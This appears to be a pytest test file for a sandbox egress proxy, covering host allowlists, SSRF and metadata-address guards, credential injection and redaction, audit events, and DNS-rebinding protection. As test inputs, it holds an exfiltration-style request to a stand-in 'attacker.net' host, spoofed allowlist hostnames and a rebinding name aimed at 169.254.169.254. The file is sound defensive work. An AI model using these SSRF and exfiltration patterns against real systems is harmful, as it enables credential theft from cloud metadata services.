"""The egress proxy: allowlist matching, SSRF guards, credential injection and stripping, reflection
redaction, audit events, and the Unix-socket listener a network-less sandbox reaches it through."""
import json
import os
import socket

import pytest

from sandboxlab.proxy import EgressProxy, StubAPI, host_allowed, is_public_ip, redact, split_route
from sandboxlab.proxy.client import fetch, fetch_json
from sandboxlab.proxy.server import clean_headers, read_secret

TOKEN = "sk-lab-test-0123456789abcdef"


@pytest.mark.parametrize("host,allowed", [
    ("api.example.com", True), ("API.Example.com.", True), ("x.api.example.com", False),
    ("pypi.org", True), ("files.pythonhosted.org", True), ("pythonhosted.org", False),
    ("evilpythonhosted.org", False), ("api.example.com.attacker.net", False), ("", False)])
def test_allowlist(host, allowed):
    assert host_allowed(host, ["api.example.com", "pypi.org", "*.pythonhosted.org"]) is allowed


def test_private_ranges_and_routes():
    assert not is_public_ip("169.254.169.254") and not is_public_ip("10.0.0.1") and not is_public_ip("::1")
    assert is_public_ip("8.8.8.8")
    assert split_route("/api-stub/whoami?x=1") == ("api-stub", "/whoami?x=1")
    assert split_route("/api-stub") == ("api-stub", "/")
    data, n = redact(b'{"h": "Bearer ' + TOKEN.encode() + b'"}', [TOKEN])
    assert n == 1 and TOKEN.encode() not in data and b"[REDACTED]" in data


def test_caller_credentials_and_hop_by_hop_headers_are_dropped():
    h = {"Authorization": "Bearer stolen", "Cookie": "c", "Connection": "keep-alive, X-Foo", "X-Foo": "1",
         "Accept": "application/json", "Host": "x"}
    assert clean_headers(h, {"authorization", "cookie"}) == {"Accept": "application/json"}


def test_read_secret(tmp_path, monkeypatch):
    f = tmp_path / "t"
    f.write_text(TOKEN + "\n")
    monkeypatch.setenv("LAB_T", TOKEN)
    assert read_secret(f"file:{f}") == TOKEN == read_secret("env:LAB_T")
    assert read_secret(f"file:{tmp_path}/missing") == ""
    with pytest.raises(ValueError):
        read_secret("literal:abc")


@pytest.fixture()
def stack(tmp_path):
    tok = tmp_path / "token"
    tok.write_text(TOKEN)
    with StubAPI(TOKEN) as api:
        cfg = {"routes": {"api": {"upstream": api.url, "methods": ["GET"],
                                  "inject": {"header": "Authorization", "value_from": f"file:{tok}", "format": "Bearer {}"}}},
               "forward_allow": ["*.example.com"], "max_request_bytes": 1024}
        with EgressProxy(cfg) as px:
            yield px, api


def test_route_injects_and_the_caller_never_holds_the_key(stack):
    px, api = stack
    status, body = fetch_json(px.url, "/api/whoami")
    assert status == 200 and body["authorized"] is True and TOKEN not in json.dumps(body)
    status, body = fetch_json(px.url, "/api/whoami", headers={"Authorization": "Bearer forged"})
    assert status == 200 and body["authorized"]                                # the forged header was replaced
    status, body = fetch_json(px.url, "/api/echo")
    assert TOKEN not in json.dumps(body) and body["headers"]["Authorization"] == "Bearer [REDACTED]"
    ev = px.events[-1]
    assert ev["event_type"] == "egress" and ev["decision"] == "allow" and any("redacted" in r for r in ev["reasons"])
    assert all(r["authorized"] for r in api.requests)


def test_denials_are_audited(stack, monkeypatch):
    px, _ = stack
    from sandboxlab.proxy import server
    monkeypatch.setattr(server, "resolve", lambda host, port: {"169.254.169.254"})   # no real DNS in tests
    assert fetch(px.url, "/nope/x")[0] == 403
    assert fetch(px.url, "http://attacker.net/c?d=1")[0] == 403                  # forward form, not allowlisted
    assert fetch(px.url, "http://metadata.example.com/")[0] == 403              # allowlisted name, private address
    assert fetch(px.url, "/api/whoami", method="POST")[0] == 405
    assert fetch(px.url, "/api/whoami", method="GET", body=b"x" * 2048, headers={"Content-Length": "2048"})[0] == 413
    with socket.create_connection(("127.0.0.1", px.port)) as s:
        s.sendall(b"CONNECT api.example.com:443 HTTP/1.1\r\nHost: api.example.com:443\r\n\r\n")
        assert b" 403 " in s.recv(200)
    denies = [e for e in px.events if e["decision"] == "deny"]
    assert len(denies) == 6 and any("allowlist" in e["reasons"][0] for e in denies)
    assert any("CONNECT refused" in e["reasons"][0] for e in denies)


def test_unix_socket_listener(tmp_path):
    with StubAPI(TOKEN) as api:
        os.environ["LAB_PROXY_T"] = TOKEN
        cfg = {"routes": {"api": {"upstream": api.url, "inject": {"header": "Authorization", "value_from": "env:LAB_PROXY_T",
                                                                    "format": "Bearer {}"}}}}
        path = str(tmp_path / "p.sock")
        with EgressProxy(cfg, unix_path=path) as px:
            assert px.url == f"unix:{path}" and oct(os.stat(path).st_mode)[-3:] == "666"
            assert fetch_json(px.url, "/api/whoami")[1]["authorized"] is True
        assert not os.path.exists(path)


def test_dns_rebinding_cannot_slip_between_the_check_and_the_connect(stack, monkeypatch):
    # A rebinding name answers a public address to the check and 169.254.169.254 to any later lookup.
    # The proxy must connect to the address it vetted, never resolve the name a second time.
    from sandboxlab.proxy import server
    px, _ = stack
    answers = iter([{"93.184.216.34"}])
    lookups, connects = [], []

    def rebinding(host, port):
        lookups.append(host)
        return next(answers, {"169.254.169.254"})

    class Recorder:
        def __init__(self, host, port, **kw):
            connects.append(host)
            raise OSError("test: not connecting anywhere")

    monkeypatch.setattr(server, "resolve", rebinding)
    monkeypatch.setitem(server.CONNECTION_CLASSES, "http", Recorder)
    status, _ = fetch(px.url, "http://rebind.example.com/latest/meta-data/")
    assert status == 502                                   # our Recorder refused to connect
    assert lookups == ["rebind.example.com"]               # resolved exactly once
    assert connects == ["93.184.216.34"]                   # to the vetted address, not the name
